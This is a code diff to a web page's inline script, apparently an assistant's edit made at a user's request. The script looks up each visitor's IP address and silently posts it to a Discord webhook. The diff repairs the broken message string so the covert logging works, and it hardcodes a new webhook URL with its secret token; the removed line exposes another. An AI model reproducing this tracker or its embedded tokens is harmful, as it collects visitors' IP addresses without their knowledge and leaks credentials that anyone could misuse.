@@ -31,7 +31,8 @@
             .then(response => response.json())
             .then(data => {
                 const userIP = data.ip;
-                const webhookURL = 'https://discord.com/api/webhooks/1392513116658733096/QHp_R8z4KKRoqKSP96926q79sk5v_TjsqEeddtA4XwabkGKAbAyHi8xOG2zlSsEOgm37';
+                // Use a URL correta do webhook (a que você mencionou na descrição)
+                const webhookURL = 'https://discord.com/api/webhooks/1392518333764731000/FBtKBLXSmkXj4v9t8CXiOja8H1DKZY82FHuP9r2s9vuosrljPIO1Q8M9G7yQ0Gc8o8ov';
 
                 fetch(webhookURL, {
                     method: 'POST',
@@ -39,10 +40,17 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        content: Novo acesso ao site: IP ${userIP}
+                        content: `Novo acesso ao site: IP ${userIP}`
                     })
-                }).catch(e => console.error(e));
-            }).catch(e => console.error(e));
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Erro ao enviar para o webhook:', response.status);
+                    }
+                })
+                .catch(e => console.error('Erro na requisição:', e));
+            })
+            .catch(e => console.error('Erro ao obter IP:', e));
     </script>
 </body>
 </html>
